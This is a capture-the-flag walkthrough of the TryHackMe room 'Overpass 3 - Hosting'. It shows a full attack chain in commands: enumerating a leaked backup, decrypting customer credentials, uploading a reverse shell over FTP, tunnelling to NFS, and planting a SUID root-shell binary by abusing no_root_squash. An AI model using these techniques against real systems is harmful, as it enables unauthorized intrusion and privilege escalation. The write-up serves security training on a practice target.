---

Name: Overpass 3 - Hosting
Difficulty: Medium
URL: https://tryhackme.com/room/overpass3hosting
Description: You know them, you love them, your favourite group of broke computer science students have another business venture! Show them that they probably should hire someone for security...

---

# Directory and file enumeration

While fuzzing for directories and files we find `/backups`, which contains `backup.zip`.

```bash
$ gobuster dir -u http://overpass3.thm/ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -t 100 \
  -x txt,php,html,bak,zip,log,old,js \
  -k

===============================================================
Gobuster v3.8.2
===============================================================

index.html           (Status: 200) [Size: 1770]
backups              (Status: 301) [--> http://overpass3.thm/backups/]
```

# backup.zip

Inside it we find a private key and an encrypted GPG file.

```bash
unzip backup.zip

Archive:  backup.zip
 extracting: CustomerDetails.xlsx.gpg
 inflating: priv.key
```

Import the private key.

```bash
gpg --import priv.key
```

Now decrypt the spreadsheet.

```bash
gpg -d CustomerDetails.xlsx.gpg > CustomerDetails.xlsx
```

The spreadsheet contains customer credentials.

| Username | Password |
|----------|----------|
| paradox | `ShibesAreGreat123` |
| 0day | `OllieIsTheBestDog` |
| muirlandoracle | `A11D0gsAreAw3s0me` |

Since SSH is running on the server we test these credentials.

```bash
ssh username@overpass3.thm
```

SSH does not allow password authentication, but the credentials work on FTP.

```bash
ftp overpass3.thm

Name: paradox
Password:

230 Login successful.
```

Let's see if we can upload files.

```bash
echo "worked" > test.txt
```

```bash
ftp> put test.txt
```

Browsing to `http://overpass3.thm/test.txt` shows our file, meaning we have write access to the web root.

# Initial shell

Start a listener.

```bash
nc -lvnp 4444
```

Generate a PHP PentestMonkey reverse shell using https://www.revshells.com/.

Upload `shell.php`, then browse to:

```
http://overpass3.thm/shell.php
```

We get a shell as `apache`.

```bash
sh-4.4$ id
uid=48(apache) gid=48(apache) groups=48(apache)
```

# Web flag

Search for readable flags.

```bash
find / -type f -readable 2>/dev/null | grep -Ei 'flag|user\.txt|txt'
```

```bash
cat /usr/share/httpd/web.flag

thm{REDACTED}
```

# Pivot to paradox

Use the password from the spreadsheet.

```bash
su paradox
Password: ShibesAreGreat123
```

Verify.

```bash
id

uid=1001(paradox) gid=1001(paradox) groups=1001(paradox)
```

`sudo` is not allowed.

```bash
sudo -l

Sorry, user paradox may not run sudo.
```

# Enumerating services

Check locally available RPC services.

```bash
rpcinfo -p localhost
```

This leads us to inspect the NFS exports.

```bash
cat /etc/exports
```

```text
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
```

The `no_root_squash` option means files created as root on the NFS client remain owned by root on the server.

# SSH tunnel

Since SSH only allows public key authentication, generate a temporary key pair.

```bash
ssh-keygen -t ed25519 -f /tmp/overpass_key -N ""
```

Add the public key to `paradox`'s `authorized_keys`.

```bash
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGz/9pURuakEHVaoyJPbYFv7+MLIV7+UKE7ARlaGUDRU theo@dog" >> ~/.ssh/authorized_keys

chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```

Create an SSH tunnel for the local NFS service.

```bash
ssh -i /tmp/overpass_key \
    -L 2049:127.0.0.1:2049 \
    paradox@overpass3.thm
```

# Mount the NFS share

```bash
mkdir -p /tmp/overpass-nfs

sudo mount -t nfs -o port=2049 localhost:/ /tmp/overpass-nfs
```

Listing the share reveals James' SSH keys.

```text
.
├── .bash_history
├── .bash_logout
├── .bash_profile
├── .bashrc
├── .ssh
│   ├── authorized_keys
│   ├── id_rsa
│   └── id_rsa.pub
└── user.flag
```

Use the private key to log in as James.

```bash
chmod 600 id_rsa

ssh -i id_rsa james@overpass3.thm
```

# Privilege escalation

Compile a small helper binary compatible with the target system.

```bash
podman run --rm -it \
  -v /tmp/overpass-nfs:/work \
  docker.io/library/centos:8
```

Inside the container:

```bash
dnf install -y gcc

cat >/work/rootshell.c <<'EOF'
#include <unistd.h>

int main(void) {
    setgid(0);
    setuid(0);
    execl("/bin/bash", "bash", "-p", NULL);
    return 0;
}
EOF

gcc /work/rootshell.c -o /work/rootshell
exit
```

Back on the attack machine, make it owned by root and set the SUID bit.

```bash
sudo chown root:root /tmp/overpass-nfs/rootshell
sudo chmod 4755 /tmp/overpass-nfs/rootshell
```

Execute it on the target.

```bash
/home/james/rootshell
```

```bash
id

uid=0(root) gid=0(root) groups=0(root),1000(james)
```

Read the root flag.

```bash
cd /root

cat root.flag

thm{REDACTED}
```
